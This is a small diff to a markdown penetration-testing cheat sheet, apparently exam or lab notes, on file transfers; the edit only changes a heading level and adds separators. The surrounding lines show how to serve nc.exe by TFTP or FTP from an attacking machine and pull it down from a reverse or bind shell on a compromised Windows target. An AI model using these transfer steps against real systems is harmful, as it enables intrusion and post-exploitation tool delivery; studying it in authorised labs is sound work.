@@ -1,4 +1,4 @@
-### File Transfers
+## File Transfers
 #### TFTP UDP Transfer
 ```
 # Create directory to serve files
@@ -13,6 +13,7 @@ cp /usr/share/windows-binaries/nc.exe /tftp/
 # In your reverse/bind shell on the target machine, change 10.11.1.140 to attacking ip
 tftp -i 10.11.1.140 GET nc.exe
 ```
+---
 #### FTP File Transfer
 On attacking machine, setup an ftp server
 `apt-get install pure-ftpd`
@@ -35,5 +36,5 @@ echo bye>> ftp.txt
 ```
 Now in your Windows bind/reverse shell run the ftp.txt file
 `ftp -v -n -s:ftp.txt`
-
+---
 
